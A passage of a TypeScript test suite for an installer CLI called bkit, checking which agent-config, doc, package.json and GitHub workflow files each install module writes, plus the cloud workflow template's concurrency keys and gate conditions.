import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { spawnSync } from "node:child_process";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import type { WriteSet } from "../write";
import {
  parseModelLookup,
  buildOpencodeModelLookup,
  parseEffortMap,
  listFilesRecursive,
  remapTemplateDest,
} from "../../commands/install/install";
import { extractManagedBlock } from "../managed-block";
import type { PreflightFinding } from "../../checks/before/index";
import {
  runCoreModule,
  runClaudeModule,
  runCloudModule,
  runOpencodeModule,
  renderOpencodeJson,
  reconcileOpencodeJson,
  reconcileMcpJson,
  opencodeProviderId,
  dispatchModules,
  detectGateAdvisories,
  detectNoopGates,
  isNoopScript,
  isTemplate,
  listStampedFiles,
  readInstallingVersion,
  runBkitDocs,
  getPkgRoot,
  type ModuleContext,
} from "./index";
import { BKIT_GATE_SCRIPTS } from "../manifest";
import { readBkitVersion, readManagedVersion, writeBkitVersion } from "../version-file";
import { applyTokens } from "../placeholders";
import { writeTier2JsonContained } from "../write";
import { writeCursorCliPermissionsArtifact } from "../cloud-env";
import { enrichClaudeSettingsAllows } from "./index";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

let tmpDir: string;
let originalCwd: string;

function makeWriteSet(): WriteSet {
  return { writes: [] };
}

function makeCtx(overrides: Partial<ModuleContext> = {}): ModuleContext {
  return {
    dryRun: false,
    tokens: {
      DEFAULT_BRANCH: "main",
      PROJECT_NAME: "test-project",
      REPO_SLUG: "acme/test-project",
    },
    modelLookup: new Map(),
    opencodeModelLookup: new Map(),
    effortMap: new Map(),
    advisories: [],
    ws: makeWriteSet(),
    logPrefix: "[bkit-install]",
    postDispatch: [],
    issueTracker: "none",
    ...overrides,
  };
}

/** Flush postDispatch callbacks — call after runCoreModule (or other module fn) when testing directly. */
function flushPostDispatch(ctx: ModuleContext): void {
  for (const cb of ctx.postDispatch) {
    cb();
  }
}

beforeEach(() => {
  originalCwd = process.cwd();
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-modules-test-"));
  // Seed package.json so resolveTokens doesn't fail
  fs.writeFileSync(
    path.join(tmpDir, "package.json"),
    JSON.stringify({ name: "test-project", packageManager: "pnpm@10.4.1" }),
    "utf-8",
  );
  process.chdir(tmpDir);
});

afterEach(() => {
  process.chdir(originalCwd);
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

// ---------------------------------------------------------------------------
// Canonical .bkit/*.md docs mirrored into the consumer's .bkit/
// ---------------------------------------------------------------------------

describe("bkit canonical docs pass (runBkitDocs, #218)", () => {
  // Test file lives in `.bkit/core/engine/install/modules/`, so `../../../..` is the package `.bkit/` docs root —
  // the same source runBkitDocs copies from (getBkitDocsRoot).
  const PKG_DOCS_ROOT = path.resolve(
    import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname),
    "../../../..",
  );
  const DOCS = [
    "cloud.md",
    "jsonl.md",
    "providers.md",
    "prompts.md",
    "trackers.md",
    "workflows.md",
    "README.md",
  ];

  const rendered = (name: string): string =>
    applyTokens(fs.readFileSync(path.join(PKG_DOCS_ROOT, name), "utf-8"), makeCtx().tokens);

  it("force-overwrites the seven package .bkit/*.md docs into the consumer's .bkit/, rendered", () => {
    const ctx = makeCtx();
    runCoreModule(ctx);
    flushPostDispatch(ctx);

    for (const name of DOCS) {
      const dst = path.join(tmpDir, ".bkit", name);
      expect(fs.existsSync(dst), `consumer .bkit/${name} must exist after install`).toBe(true);
      expect(
        fs.readFileSync(dst, "utf-8"),
        `consumer .bkit/${name} must equal the rendered package source`,
      ).toBe(rendered(name));
      expect(readManagedVersion(fs.readFileSync(dst, "utf-8")), name).toBe(readInstallingVersion());
    }
  });

  it("leaves a doc unrendered, and unchecked, where its package source is the destination (dogfood)", () => {
    const doc = path.join(".bkit", "workflows.md");
    expect(listStampedFiles(tmpDir).map((f) => f.path)).toContain(doc);
    expect(listStampedFiles(getPkgRoot()).map((f) => f.path)).not.toContain(doc);

    process.chdir(getPkgRoot());
    const ws = makeWriteSet();
    runBkitDocs(true, makeCtx().tokens, ws, "[test]");
    expect(ws.writes).toEqual([]);
  });

  it("is idempotent: a second core run writes none of the docs again", () => {
    runCoreModule(makeCtx()); // first install seeds the docs
    const ctx2 = makeCtx();
    runCoreModule(ctx2);
    const docWrites = ctx2.ws.writes.filter((w) =>
      DOCS.some((d) => w.path === path.join(".bkit", d)),
    );
    expect(docWrites).toHaveLength(0);
  });

  it("overwrites a consumer-tampered doc (bkit owns canonical content)", () => {
    const dst = path.join(tmpDir, ".bkit", "cloud.md");
    fs.mkdirSync(path.dirname(dst), { recursive: true });
    fs.writeFileSync(dst, "consumer tampered content\n", "utf-8");
    runCoreModule(makeCtx());
    expect(fs.readFileSync(dst, "utf-8")).toBe(rendered("cloud.md"));
  });
});

// ---------------------------------------------------------------------------
// Templates are the consumer's: install leaves an adopted copy alone
// ---------------------------------------------------------------------------

describe("install never writes or flags an adopted template copy", () => {
  const ALL = new Set<import("../../cli").ModuleFlag>([
    "core",
    "claude",
    "cursor",
    "lint",
    "cloud",
  ]);
  const bkitDir = path.resolve(
    import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname),
    "../../../..",
  );
  // The cursor module renders agents, so it needs the real model catalog.
  const promptsMd = path.join(bkitDir, "prompts.md");
  const hostCtx = (overrides: Partial<ModuleContext>): ModuleContext =>
    makeCtx({
      modelLookup: parseModelLookup(promptsMd),
      effortMap: parseEffortMap(promptsMd),
      ...overrides,
    });
  const templatePaths = (): string[] => {
    const root = path.join(bkitDir, "templates");
    return listFilesRecursive(root)
      .map((abs) => remapTemplateDest(path.relative(root, abs)))
      .filter((rel) => isTemplate(rel));
  };

  it("an adopted copy of every template stays byte-identical, with no write and no advisory for it", () => {
    const adopted = templatePaths();
    for (const rel of adopted) {
      fs.mkdirSync(path.dirname(path.join(tmpDir, rel)), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, rel), `consumer's own ${rel}\n`, "utf-8");
    }
    const ws = makeWriteSet();
    const ctx = hostCtx({ ws, cloudVariant: "cursor", issueTracker: "linear" });
    dispatchModules(ALL, ctx);

    for (const rel of adopted) {
      expect(fs.readFileSync(path.join(tmpDir, rel), "utf-8"), rel).toBe(`consumer's own ${rel}\n`);
    }
    const adoptedSet = new Set(adopted);
    expect(
      ws.writes.filter((w) => adoptedSet.has(path.relative(tmpDir, path.resolve(w.path)))),
    ).toEqual([]);
    // No module advisory is about an adopted copy (no merge suggestion, no drift nag). The
    // cloud setup advisories name the templates: they say what to copy.
    const setupIds = new Set(["bkit-cloud-setup", "cloud-env-customize"]);
    expect(
      ctx.advisories.filter(
        (a) => !setupIds.has(a.id) && adopted.some((rel) => a.detect.includes(rel)),
      ),
    ).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// v4-3 Module dispatch integration tests
// ---------------------------------------------------------------------------

describe("module dispatch: --claude seeds only .claude/** + core", () => {
  it("--claude writes only .claude/** + core files; no .cursor/, .github/, .vale*, .husky/", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // Run only core + claude modules
    dispatchModules(new Set(["core", "claude"]), ctx);

    // Filter out internal payload paths (.bkit/templates/** are template copies, not consumer outputs)
    const consumerOutputPaths = ws.writes
      .map((e) => e.path)
      .filter((p) => !/(^|[/\\])\.bkit[/\\]templates[/\\]/.test(p))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}workflows${path.sep}`))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}prompts${path.sep}`));

    // Consumer outputs: no .cursor/, no .github/workflows/, no .vale*, no .husky/
    for (const p of consumerOutputPaths) {
      expect(p).not.toMatch(/[/\\]\.cursor[/\\]/);
      expect(p).not.toMatch(/[/\\]\.github[/\\]workflows[/\\]/);
      expect(p).not.toMatch(/[/\\]\.vale/);
      expect(p).not.toMatch(/[/\\]\.husky[/\\]/);
    }
  });
});

describe("module dispatch: --typescript seeds core + lint only", () => {
  it("--typescript writes core + the slop plugin; nothing under Cursor/Claude/Husky", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    dispatchModules(new Set(["core", "lint"]), ctx);

    // Filter out internal payload paths (.bkit/templates/** are template copies)
    const consumerOutputPaths = ws.writes
      .map((e) => e.path)
      .filter((p) => !/(^|[/\\])\.bkit[/\\]templates[/\\]/.test(p))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}workflows${path.sep}`))
      .filter((p) => !p.includes(`${path.sep}.agents${path.sep}prompts${path.sep}`));

    // Assert: no .cursor/ writes, no .claude/ writes, no .husky/ writes (consumer outputs only)
    for (const p of consumerOutputPaths) {
      expect(p).not.toMatch(/[/\\]\.cursor[/\\]/);
      expect(p).not.toMatch(/[/\\]\.claude[/\\]/);
      expect(p).not.toMatch(/[/\\]\.husky[/\\]/);
    }
    expect(consumerOutputPaths).toContain(
      path.join(".bkit", "scripts", "bkit-slop-type-suppression.mjs"),
    );
  });
});

describe("--typescript footprint (#265)", () => {
  const TOOL_SCRIPTS = [
    "typecheck",
    "lint",
    "format:check",
    "lint:prose",
    "lint:slop",
    "slop:delta",
  ];

  it("writes only the owned slop plugin: no tool config, tool script, devDep or prepare", () => {
    dispatchModules(new Set(["core", "lint"]), makeCtx({}));
    expect(
      fs.existsSync(path.join(tmpDir, ".bkit", "scripts", "bkit-slop-type-suppression.mjs")),
    ).toBe(true);
    for (const rel of [
      "slop-scan.config.json",
      ".prettierignore",
      ".lintstagedrc.json",
      ".vale.ini",
      ".husky/pre-push",
      ".github/workflows/ci.yml",
    ]) {
      expect(fs.existsSync(path.join(tmpDir, rel)), rel).toBe(false);
    }
    const pkg = JSON.parse(fs.readFileSync(path.join(tmpDir, "package.json"), "utf-8"));
    for (const name of [...TOOL_SCRIPTS, "prepare"]) {
      expect(pkg.scripts?.[name], name).toBeUndefined();
    }
    expect(pkg.devDependencies).toBeUndefined();
  });

  it("a fresh --claude install seeds every bkit:gate:* name and no tool script or devDep", () => {
    dispatchModules(new Set(["core", "claude"]), makeCtx({}));
    const pkg = JSON.parse(fs.readFileSync(path.join(tmpDir, "package.json"), "utf-8"));
    expect(pkg.scripts).toEqual(BKIT_GATE_SCRIPTS);
    expect(pkg.devDependencies).toBeUndefined();
  });
});

describe("module dispatch: --full ≡ no flags (writeset equality)", () => {
  it("--full and no flags produce the same set of modules dispatched", () => {
    const moduleSet = new Set<import("../../cli").ModuleFlag>(["core", "claude", "lint"]);

    // Run 1: fresh tmpdir (beforeEach already set up)
    const cwd1 = process.cwd();
    const ws1 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws1 }));
    // Get relative paths
    const relPaths1 = ws1.writes.map((e) => path.relative(cwd1, e.path)).sort();

    // Create fresh tmpdir2 for run 2
    process.chdir(originalCwd);
    const tmpDir2 = fs.mkdtempSync(path.join(os.tmpdir(), "bkit-modules-test-"));
    tmpDir = tmpDir2; // update so afterEach cleans it
    fs.writeFileSync(
      path.join(tmpDir2, "package.json"),
      JSON.stringify({ name: "test-project", packageManager: "pnpm@10.4.1" }),
      "utf-8",
    );
    process.chdir(tmpDir2);

    // Run 2: fresh tmpdir2
    const cwd2 = process.cwd();
    const ws2 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws2 }));
    const relPaths2 = ws2.writes.map((e) => path.relative(cwd2, e.path)).sort();

    // Both runs on identical starting state → same relative writeset
    expect(relPaths1).toEqual(relPaths2);
  });
});

describe("module dispatch: --core is implicit before any other module", () => {
  it("core module writes occur before other module writes (.bkit-version is LAST — after all modules)", () => {
    const realWs = makeWriteSet();
    const ctx = makeCtx({ ws: realWs });

    // Dispatch core + lint (core must run first per MODULE_DISPATCH_ORDER)
    dispatchModules(new Set(["core", "lint"]), ctx);

    const paths = realWs.writes.map((e) => e.path);
    const agentsMdIdx = paths.indexOf("AGENTS.md");
    const slopPluginIdx = paths.indexOf(
      path.join(".bkit", "scripts", "bkit-slop-type-suppression.mjs"),
    );
    // .bkit-version is written in postDispatch — AFTER all module writes
    const bkitVersionIdx = paths.findIndex((p) => p.endsWith(path.join(".bkit", "version")));
    expect(agentsMdIdx).toBeGreaterThanOrEqual(0);
    expect(agentsMdIdx).toBeLessThan(slopPluginIdx);
    expect(slopPluginIdx).toBeLessThan(bkitVersionIdx);
  });
});

describe("module dispatch: idempotence — second install --full produces zero writes", () => {
  it("running dispatchModules twice stabilises: third run = zero writes (true idempotence)", () => {
    const moduleSet = new Set<import("../../cli").ModuleFlag>(["core", "lint"]);

    // First run — creates files from scratch
    const ws1 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws1 }));
    expect(ws1.writes.length).toBeGreaterThan(0); // something was written

    // Second run — normalises block spacing (may have a few writes)
    const ws2 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws2 }));

    // Third run — true idempotence: should be zero writes
    const ws3 = makeWriteSet();
    dispatchModules(moduleSet, makeCtx({ ws: ws3 }));

    expect(ws3.writes).toHaveLength(0);
  });
});

describe(".bkit-version write-order regression (Reviewer 1 #7 + MED-4)", () => {
  it(".bkit-version is written LAST — after all modules complete (postDispatch)", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });

    // dispatchModules runs all modules then flushes postDispatch (where .bkit-version is written)
    dispatchModules(new Set(["core"]), ctx);

    const writeOrder = ws.writes.map((e) => e.path);
    const bkitVersionIdx = writeOrder.findIndex((p) => p.includes(".bkit/version"));

    // .bkit-version should be present
    expect(bkitVersionIdx).toBeGreaterThanOrEqual(0);

    // .bkit-version should be the LAST write (postDispatch runs after all module writes)
    if (writeOrder.length > 1) {
      expect(bkitVersionIdx).toBe(writeOrder.length - 1);
    }
  });

  it(".bkit-version is absent if postDispatch is NOT flushed (mid-install crash simulation)", () => {
    // If a crash prevents postDispatch from running, .bkit-version must NOT be on disk.
    const versionFile = path.join(tmpDir, ".bkit", "version");
    expect(fs.existsSync(versionFile)).toBe(false);

    const ws = makeWriteSet();
    const ctx = makeCtx({ ws });
    // Simulate: core module ran, but postDispatch was never flushed (crash in another module)
    runCoreModule(ctx);
    // Do NOT call flushPostDispatch — .bkit-version must still be absent
    expect(fs.existsSync(versionFile)).toBe(false);

    // After flushing, it appears
    flushPostDispatch(ctx);
    expect(fs.existsSync(versionFile)).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// runCloudModule — opt-in post-CI auto-routing
// ---------------------------------------------------------------------------

describe("runCloudModule — opt-in cloud agents (post-CI auto-routing)", () => {
  const routerRel = path.join(".github", "workflows", "bkit-cloud.yml");
  const bootstrapRel = path.join(".claude", "hooks", "cloud-bootstrap.sh");
  const dockerRel = path.join(".cursor", "Dockerfile");
  const envRel = path.join(".cursor", "environment.json");

  it("cloud=claude: writes only cloud-bootstrap.sh and points the setup advisory at the workflow template", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws, cloudVariant: "claude" });
    runCloudModule(ctx);

    expect(fs.existsSync(path.join(tmpDir, bootstrapRel))).toBe(true);
    expect(fs.existsSync(path.join(tmpDir, routerRel))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, dockerRel))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, envRel))).toBe(false);

    const advisory = ctx.advisories.find((a) => a.id === "bkit-cloud-setup");
    expect(advisory).toBeDefined();
    expect(advisory!.action).toContain(".bkit/templates/.github/workflows/bkit-cloud.yml");
    expect(advisory!.action).toMatch(/Add `ANTHROPIC_API_KEY`/);
    expect(advisory!.action).toMatch(/install-github-app/);
    // Bare `Auto` must NOT appear in advisory text (migrated to bkit:auto)
    expect(advisory!.action).not.toMatch(/\bAuto\b(?! route)/);
    expect(advisory!.action).toMatch(/bkit:auto/);
    expect(advisory!.action).not.toMatch(/BKIT_LINEAR_API_KEY/);
    // The env-scaffolding customisation advisory is emitted for cloud=claude too.
    expect(ctx.advisories.find((a) => a.id === "cloud-env-customize")).toBeDefined();
  });

  it("cloud=opencode: writes no files and points the setup advisory at the workflow template", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws, cloudVariant: "opencode", issueTracker: "github" });
    runCloudModule(ctx);

    expect(ws.writes).toEqual([]);
    expect(fs.existsSync(path.join(tmpDir, routerRel))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, bootstrapRel))).toBe(false);

    const advisory = ctx.advisories.find((a) => a.id === "bkit-cloud-setup");
    expect(advisory).toBeDefined();
    expect(advisory!.action).toContain(".bkit/templates/.github/workflows/bkit-cloud.yml");
    expect(advisory!.action).toMatch(/OPENCODE_PROVIDER_KEY/);
    expect(advisory!.action).not.toMatch(/BKIT_ANTHROPIC_API_KEY/);
  });

  it("cloud=cursor: writes no files and points the setup advisory at the .cursor templates", () => {
    const ws = makeWriteSet();
    const ctx = makeCtx({ ws, cloudVariant: "cursor", issueTracker: "linear" });
    runCloudModule(ctx);

    expect(ws.writes).toEqual([]);
    expect(fs.existsSync(path.join(tmpDir, dockerRel))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, envRel))).toBe(false);
    expect(fs.existsSync(path.join(tmpDir, routerRel))).toBe(false);

    const advisory = ctx.advisories.find((a) => a.id === "bkit-cloud-setup");
    expect(advisory).toBeDefined();
    expect(advisory!.action).toContain(".bkit/templates/.cursor/Dockerfile");
    expect(advisory!.action).toContain(".bkit/templates/.cursor/environment.json");
    expect(advisory!.action).toMatch(/BKIT_LINEAR_API_KEY/);
  });

  it("an adopted bkit-cloud.yml, Dockerfile and environment.json stay byte-identical", () => {
    for (const rel of [routerRel, dockerRel, envRel]) {
      fs.mkdirSync(path.dirname(path.join(tmpDir, rel)), { recursive: true });
      fs.writeFileSync(path.join(tmpDir, rel), `mine: ${rel}\n`, "utf-8");
    }
    for (const cloudVariant of ["claude", "opencode", "cursor"] as const) {
      runCloudModule(
        makeCtx({ cloudVariant, issueTracker: cloudVariant === "cursor" ? "linear" : "github" }),
      );
    }
    for (const rel of [routerRel, dockerRel, envRel]) {
      expect(fs.readFileSync(path.join(tmpDir, rel), "utf-8")).toBe(`mine: ${rel}\n`);
    }
  });

  for (const variant of ["claude", "opencode", "cursor"] as const) {
    it(`cloud=${variant}: persists bkit.cloudAgents = '${variant}' to package.json`, () => {
      runCloudModule(makeCtx({ cloudVariant: variant }));
      const pkg = JSON.parse(fs.readFileSync(path.join(tmpDir, "package.json"), "utf-8")) as {
        bkit?: { cloudAgents?: string };
      };
      expect(pkg.bkit?.cloudAgents).toBe(variant);
    });
  }

  it("dry-run: writes nothing to disk but still emits the setup advisory", () => {
    const ctx = makeCtx({ dryRun: true, cloudVariant: "claude" });
    runCloudModule(ctx);

    expect(fs.existsSync(path.join(tmpDir, bootstrapRel))).toBe(false);
    expect(ctx.advisories.find((a) => a.id === "bkit-cloud-setup")).toBeDefined();
  });

  it("the default module set does NOT ship cloud scaffolding", () => {
    // `cursor` is omitted — its applyT3 transform process.exit(1)s on the empty
    // modelLookup in this harness (see the dispatch tests above).
    dispatchModules(new Set(["core", "claude", "lint"]), makeCtx({}));
    // claude is in the set — cloud-bootstrap.sh is in --cloud, not claude.
    expect(fs.existsSync(path.join(tmpDir, bootstrapRel))).toBe(false);
  });
});

describe("bkit-cloud.yml template — GitHub-only content", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
  const yml = fs.readFileSync(
    path.join(pkgRoot, ".bkit/templates/.github/workflows/bkit-cloud.yml"),
    "utf-8",
  );

  it("carries id-token: write, GitHub MCP only and no tracker sentinels", () => {
    expect(yml).toContain("id-token: write");
    expect(yml).not.toContain("BKIT_LINEAR_API_KEY");
    expect(yml).not.toContain("mcp__linear__*");
    expect(yml).toContain("mcp__github__*");
    expect(yml).not.toMatch(/@@CLOUD_TRACKER/);
    expect(yml).toMatch(
      /ANTHROPIC_API_KEY: \$\{\{ secrets\.ANTHROPIC_API_KEY \}\}\n {10}GH_TOKEN:/,
    );
  });

  it("both jobs' runs-on are the {{CLOUD_RUNNER}} placeholder the consumer fills in", () => {
    const runsOn = [...yml.matchAll(/^ {4}runs-on: (.+)$/gm)].map((m) => m[1]);
    expect(runsOn).toEqual(["{{CLOUD_RUNNER}}", "{{CLOUD_RUNNER}}"]);
  });

  it("header states App required and the bkit:auto label (no bare Auto)", () => {
    expect(yml).toMatch(/bkit:auto/);
    expect(yml).not.toMatch(/Required tracker label on the issue: `Auto`/);
  });
});

// ---------------------------------------------------------------------------
// T3.1 — D3 concurrency-key intra-surface serialisation (PIVOT from STANDARD attempt)
//
// GHA evaluates concurrency.group from trigger-payload context ONLY, before any step
// runs. The dispatch payload exposes only inputs.issue (bare numeric id, e.g. "141");
// the workflow_run payload exposes only head_branch (= feat/{FID-with-slug}, e.g.
// "feat/141-cloud-app"). GHA expression functions (contains/startsWith/endsWith/
// format/join/toJSON/fromJSON/hashFiles) include NO regex, NO split, and NO replace()
// capable of stripping a slug — replace('feat/141-cloud-app','feat/','') yields
// '141-cloud-app', not '141'. Therefore cross-surface token equality is structurally
// impossible via expressions alone for slugged FIDs (bkit-build.md:146 convention).
//
// Chosen design (Option iii): serialise WITHIN each surface separately:
//   - dispatch path  keys on inputs.issue          (bkit-auto-141)
//   - CI-completion  keys on head_branch            (bkit-auto-feat/141-cloud-app)
// Cross-boundary dispatch-vs-auto-ship race is handled by the orchestrator stale-run
// guard + the per-feature workflow lock, not the concurrency key.
// ---------------------------------------------------------------------------

describe("T3.1 — concurrency.group intra-surface serialisation (D3 race prevention)", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
  const rawTemplate = fs.readFileSync(
    path.join(pkgRoot, ".bkit/templates/.github/workflows/bkit-cloud.yml"),
    "utf-8",
  );

  it("concurrency.group dispatch path keys on inputs.issue (bare issue number)", () => {
    const out = rawTemplate;
    // Dispatch surface: group expression must use inputs.issue so concurrent dispatched
    // runs for the same issue cancel each other.
    expect(out).toMatch(/group:.*inputs\.issue/);
    const groupLine = out.split("\n").find((l) => l.includes("group: bkit-auto-"));
    expect(groupLine).toBeDefined();
    expect(groupLine).toContain("inputs.issue");
    // No invalid replace() call — remove() is not a GHA expression function.
    expect(groupLine).not.toContain("replace(");
  });

  it("concurrency.group CI-completion path keys on head_branch (full slugged branch name)", () => {
    const out = rawTemplate;
    // CI-completion surface: group expression must use head_branch directly, so concurrent
    // CI runs for the same branch (e.g. feat/141-cloud-app) cancel each other.
    // A real slugged FID like feat/141-cloud-app keys on the full branch — not a
    // stripped token (replace() cannot reduce '141-cloud-app' to '141').
    expect(out).toMatch(/group:.*github\.event\.workflow_run\.head_branch/);
    const groupLine = out.split("\n").find((l) => l.includes("group: bkit-auto-"));
    expect(groupLine).toBeDefined();
    expect(groupLine).toContain("github.event.workflow_run.head_branch");
    // No replace() — the prior STANDARD attempt's replace() was invalid for slugged FIDs.
    expect(groupLine).not.toContain("replace(");
  });

  it("realistic slugged branch (feat/141-cloud-app) does NOT equal dispatch issue number (141) — cross-surface asymmetry is expected and documented", () => {
    // replace('feat/141-cloud-app', 'feat/', '') = '141-cloud-app' != '141'
    // The two tokens differ across surfaces; each surface uses its own payload identity.
    // Cross-boundary serialisation is the orchestrator's concern.
    const dispatchGroup = `bkit-auto-141`;
    const ciBranch = "feat/141-cloud-app";
    const ciGroup = `bkit-auto-${ciBranch}`; // full branch, no replace()
    expect(dispatchGroup).not.toBe(ciGroup); // different by design
    // Neither path uses a replace() that would produce an incorrect result.
    const stripped = ciBranch.replace("feat/", "");
    expect(stripped).toBe("141-cloud-app"); // NOT '141'
    expect(stripped).not.toBe("141");
  });
});

// ---------------------------------------------------------------------------
// T2.7 — two-tier CI gate positive assertions (GAP-3)
//
// (b) marker->HEAD->fires-to-dispatch render assertion: when 'bkit [auto route]'
//     IS in workflow_run.head_commit.message AND bkit:auto is present, the gate
//     evaluates true and reaches the dispatch step.
// (c) ISSUE single-sourcing assertion: the kill-switch gh issue view $ISSUE is
//     produced by the SHARED-DERIV step (primary: PR body marker; fallback: branch
//     slug extraction). Note: with intra-surface concurrency (T3.1 PIVOT design), the
//     CI-completion concurrency key uses head_branch directly — ISSUE from SHARED-DERIV
//     is the issue number for the kill switch, not the concurrency token. The
//     single-sourcing here means ISSUE is set once in SHARED-DERIV and consumed by the
//     kill switch — not re-derived elsewhere.
// ---------------------------------------------------------------------------

describe("T2.7 — two-tier CI gate positive assertions (GAP-3)", () => {
  const scriptsDir = import.meta.dirname ?? path.dirname(new URL(import.meta.url).pathname);
  const pkgRoot = path.resolve(scriptsDir, "..", "..", "..", "..", "..");
  const rawTemplate = fs.readFileSync(
    path.join(pkgRoot, ".bkit/templates/.github/workflows/bkit-cloud.yml"),
    "utf-8",
  );

  it("(b) free-tier if: contains 'bkit [auto route]' — gate fires when marker is HEAD commit", () => {
    const out = rawTemplate;
    // The job-level if: must reference 'bkit [auto route]' in head_commit.message.
    // This closes the marker->HEAD->job-fires chain (positive, not just negative).
    expect(out).toContain(
      "contains(github.event.workflow_run.head_commit.message, 'bkit [auto route]')",
    );
    // The dispatch step must exist and fire when skip != 'true' (compound condition includes gate check).
    expect(out).toContain("steps.ctx.outputs.skip != 'true'");
    // The dispatch step must invoke the /bkit-auto orchestrator.
    expect(out).toContain(
      'prompt: "/bkit-auto ${{ steps.ctx.outputs.phase }} ${{ steps.ctx.outputs.arg }}"',
    );
  });

  it("(b) dispatch path always proceeds (workflow_dispatch bypasses marker check)", () => {
    const out = rawTemplate;
    // workflow_dispatch runs must always pass the free-tier gate regardless of marker.
    expect(out).toContain("github.event_name == 'workflow_dispatch'");
    // The if: uses || so dispatch path short-circuits the marker check. The
    // free-tier if: carries a same-repo (fork-origin guard) predicate and a
    // dev-success early-exit clause between 'workflow_dispatch' and the marker literal.
    expect(out).toMatch(/workflow_dispatch[\s\S]{0,400}bkit \[auto route\]/);
  });

  it("(c) kill-switch gh issue view uses $ISSUE from SHARED-DERIV step — single-sourced", () => {
    const out = rawTemplate;
    // The kill-switch gh issue view must use $ISSUE (not a re-derived value).
    // $ISSUE must be set by the SHARED-DERIV step (primary: PR body; fallback: branch).
    expect(out).toContain('gh issue view "$ISSUE"');
    // SHARED-DERIV must set ISSUE from PR body primary source (portable grep -oE, not PCRE -oP).
    expect(out).toContain('ISSUE=$(echo "$PR_BODY" | grep -oE');
    // SHARED-DERIV fallback sets ISSUE from FID (branch-derived numeric id): FID stays
    // the FULL slug (shared status.jsonl key with the dev path) and the short ISSUE
    // prefix is derived FROM it.
    // `|| true` is required — on the fix/** arm this runs before the slug allowlist, so
    // a non-FID branch yields no grep match and pipefail would kill the step.
    expect(out).toContain(
      "ISSUE=$(printf '%s' \"$FID\" | grep -oE '^[0-9]+|^[a-z]+-[0-9]+' | head -1 || true)",
    );
    // The ISSUE variable used by gh issue view is the SAME one set by SHARED-DERIV.
    // gh issue view must appear AFTER the SHARED-DERIV machinery (uses its output).
    const sharedDerivStart = out.indexOf("# SHARED-DERIV:");
    expect(sharedDerivStart).toBeGreaterThan(-1);
    const ghIssueViewPos = out.indexOf('gh issue view "$ISSUE"');
    expect(ghIssueViewPos).toBeGreaterThan(sharedDerivStart);
  });

  it("(c) each job's free-tier marker check lives in its job-level if: gate", () => {
    const containsExpr =
      "contains(github.event.workflow_run.head_commit.message, 'bkit [auto route]')";
    const gates = [...rawTemplate.matchAll(/^ {4}if: >-\n([\s\S]*?)^ {4}runs-on:/gm)].map(
      (m) => m[1],
    );
    expect(gates).toHaveLength(2);
    for (const gate of gates) expect(gate).toContain(containsExpr);
  });
});

// ---------------------------------------------------------------------------
// Core package.json scripts: the bkit:gate:* / bkit:deps:* names are seeded
// add-if-missing on every install; the tool scripts they chain are templates.
// ---------------------------------------------------------------------------

describe("core package.json scripts — bkit:gate:* names, add-if-missing", () => {
  function writePkg(pkg: Record<string, unknown>): void {
    fs.writeFileSync(
      path.join(tmpDir, "package.json"),
      JSON.stringify({ name: "x", version: "1.0.0", ...pkg }, null, 2) + "\n",
      "utf-8",
    );
  }

  function readPkg(): { scripts?: Record<string, string>; devDependencies?: unknown } {
    return JSON.parse(fs.readFileSync(path.join(tmpDir, "package.json"), "utf-8"));
  }

  it("an existing gate value is never touched; missing gate names are added", () => {
    writePkg({ scripts: { "bkit:gate:static": "ruff check .", "bkit:gate:format": "true" } });
    dispatchModules(new Set(["core"]), makeCtx({}));
    const scripts = readPkg().scripts ?? {};
    expect(scripts["bkit:gate:static"]).toBe("ruff check .");
    expect(scripts["bkit:gate:format"]).toBe("true");
    for (const name of Object.keys(BKIT_GATE_SCRIPTS)) {
      expect(scripts[name], name).toBeDefined();
    }
    expect(scripts["bkit:gate:static-unit"]).toBe(BKIT_GATE_SCRIPTS["bkit:gate:static-unit"]);
  });

  it("a second install writes nothing once every gate name is present", () => {
    writePkg({});
    dispatchModules(new Set(["core"]), makeCtx({}));
    const ws = makeWriteSet();
    dispatchModules(new Set(["core"]), makeCtx({ ws }));
    expect(ws.writes.filter((w) => w.path === "package.json")).toEqual([]);
  });

  it("a missing gate name is a write in dry-run, so `bkit check` reports it", () => {
    writePkg({});
    const ws = makeWriteSet();
    dispatchModules(new Set(["core"]), makeCtx({ ws, dryRun: true }));
    expect(ws.writes.some((w) => w.path === "package.json")).toBe(true);
    expect(readPkg().scripts).toBeUndefined();
  });

  it("re-points a superseded bkit slop:delta value without seeding the tool scripts", () => {
    writePkg({ scripts: { "slop:delta": "bash .bkit/scripts/bkit-slop-delta.sh" } });
    dispatchModules(new Set(["core"]), makeCtx({}));
    const scripts = readPkg().scripts ?? {};
    expect(scripts["slop:delta"]).toBe("bkit ci slop");
